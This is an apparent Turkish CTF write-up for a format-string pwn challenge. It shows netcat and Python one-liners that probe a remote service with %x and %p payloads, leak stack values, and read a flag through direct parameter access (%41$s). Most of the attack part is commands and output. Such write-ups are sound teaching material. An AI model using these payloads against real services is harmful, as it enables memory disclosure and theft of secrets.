# 🔓 Format2 - Pwn Challenge 

<p align="center">
  <img src="https://img.shields.io/badge/Pwn-Challenge-darkblue?style=for-the-badge" alt="Pwn">
  <img src="https://img.shields.io/badge/Difficulty-Orta-darkorange?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-Format String-purple?style=for-the-badge&logo=buffer" alt="Format String">
</p>

---

## 📋 Soru Bilgileri

**Kategori:** Pwn  
**Seviye:** Orta  
**Puan:** 600

**Açıklama:** "Kaynak koda yine gerek yok ;)"

**Challenge URL:** `nc 64.226.74.243 9997`


---

## 🔍 Analiz

**Hedef:** Format string vulnerability ve direct parameter access kullanarak global değişkendeki flag'i okumak

**Strateji:** Service test → Format string tespit → Deep stack leak → Direct parameter access → Flag extraction

**Seviye:** Bu sefer flag direkt stack'te değil, bir pointer aracılığıyla erişmemiz gerekiyor!

---

## ✅ Çözüm Adımları

### 🔌 **1. Servise Bağlanma**

**İlk bağlantı testi:**

```bash
nc 64.226.74.243 9997
```

**Çıktı:**
```
=== Format String Challenge (��e� version) ===
Adınız:
```

> 🎯 "Hard version" yazıyor - Bu sefer daha zor olacak!

---

### 🧪 **2. Normal Input Testi**

**Test girişi:**

```bash
echo "test" | nc 64.226.74.243 9997
```

**Çıktı:**
```
test
=== Format String Challenge (��e� version) ===
Adınız: 
Merhaba, test
```

> 📝 Program yine isim alıp "Merhaba, [isim]" yazdırıyor.

---

### 🎯 **3. Format String Vulnerability Tespiti**

**Format string test:**

```bash
echo "%x %x %x %x" | nc 64.226.74.243 9997
```

**Çıktı:**
```
%x %x %x %x
=== Format String Challenge (��e� version) ===
Adınız: 
Merhaba, 1 2 3 4
```

> ✅ **Format String Vulnerability mevcut!**  
> ⚠️ Ama bu sefer değerler farklı - sadece basit sayılar: `1, 2, 3, 4...`

---

### 🔍 **4. İlk Stack Leak Denemesi**

**20 parametre leak:**

```bash
python3 -c 'print("%p "*20)' | nc 64.226.74.243 9997
```

**Çıktı:**
```
Merhaba, 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x8 0x9 0xa 0xb 0xc 0xd 0xe 0xf 0x10 0x11 0x12 0x13 0x14
```

> ❌ Flag görünmüyor - Sadece ardışık sayılar var  
> 💡 Flag bu sefer stack'te direkt yok, daha derine bakmamız gerekiyor!

---

### 🔎 **5. Derin Stack Leak**

**50 parametre leak:**

```bash
python3 -c 'print("%p "*50)' | nc 64.226.74.243 9997
```

**Çıktı:**
```
Merhaba, 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x8 0x9 0xa 0xb 0xc 0xd 0xe 0xf 0x10 0x11 0x12 0x13 0x14 0x15 0x16 0x17 0x18 0x19 0x1a 0x1b 0x1c 0x1d 0x1e 0x1f 0x20 0x21 0x22 0x23 0x24 0x25 0x26 0x27 0x28 0x804c060 0xf7f8c620
```

> 🎯 **BULDUK!** Son taraflarda gerçek adresler var!  
> - `0x804c060` → Program adresi (.data section)  
> - `0xf7f8c620` → Libc adresi

**Hex formatla daha net görelim:**

```bash
python3 -c 'print(".%x"*50)' | nc 64.226.74.243 9997
```

**Çıktı:**
```
.1.2.3.4.5.6.7.8.9.a.b.c.d.e.f.10.11.12.13.14.15.16.17.18.19.1a.1b.1c.1d.1e.1f.20.21.22.23.24.25.26.27.28.804c060.f7fac620.
```

> ✅ **41. parametre:** `0x804c060`  
> ✅ **42. parametre:** `0xf7fac620`

---

### 🎯 **6. Direct Parameter Access ile Flag Okuma**

**Kritik Teknik: `%N$s` formatı**

Format string'de `%N$s` kullanarak N. parametreyi **string olarak** okuyabiliriz!

**41. parametredeki adresi string olarak oku:**

```bash
echo "%41\$s" | nc 64.226.74.243 9997
```

**Çıktı:**
```
=== Format String Challenge (��e� version) ===
Adınız: %41$s
Merhaba, Flag{format_string_s_brute41414141}
```

> 🎉 **FLAG BULUNDU!**

---

## 🚩 **FLAG**

```
Flag{format_string_s_brute41414141}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🔌<br><b>netcat</b><br><sub>Servis bağlantısı</sub></td>
<td align="center">🐍<br><b>Python</b><br><sub>Payload oluşturma</sub></td>
<td align="center">🔍<br><b>Format String</b><br><sub>%p, %x, %N$s</sub></td>
<td align="center">📊<br><b>Deep Stack Leak</b><br><sub>50+ parametre tarama</sub></td>
</tr>
</table>

**Kullanılan Komutlar:**

```bash
# Normal test
echo "test" | nc 64.226.74.243 9997

# Format string vulnerability test
echo "%x %x %x %x" | nc 64.226.74.243 9997

# İlk stack leak (20 parametre)
python3 -c 'print("%p "*20)' | nc 64.226.74.243 9997

# Derin stack leak (50 parametre)
python3 -c 'print("%p "*50)' | nc 64.226.74.243 9997

# Hex formatla görüntüleme
python3 -c 'print(".%x"*50)' | nc 64.226.74.243 9997

# Direct parameter access ile flag okuma
echo "%41\$s" | nc 64.226.74.243 9997
```

---

## 💭 **Çözüm Akış Şeması**

```
🔓 Pwn Challenge: "Format2" (Hard Version)
                    ↓
        🔌 nc 64.226.74.243 9997
                    ↓
        📝 "Adınız:" girdisi isteniyor
                    ↓
        🧪 Normal input test → Çalışıyor
                    ↓
        🎯 Format string test → VAR!
                    ↓
        🔍 %x %x %x → 1 2 3 4 (Sadece sayılar)
                    ↓
        ❌ İlk 20 parametrede flag yok
                    ↓
        🔎 50 parametre derin tarama
                    ↓
        🎯 41. parametre: 0x804c060 (Adres!)
                    ↓
        💡 Direct parameter access: %41$s
                    ↓
        🚩 Flag{format_string_s_brute41414141}
```
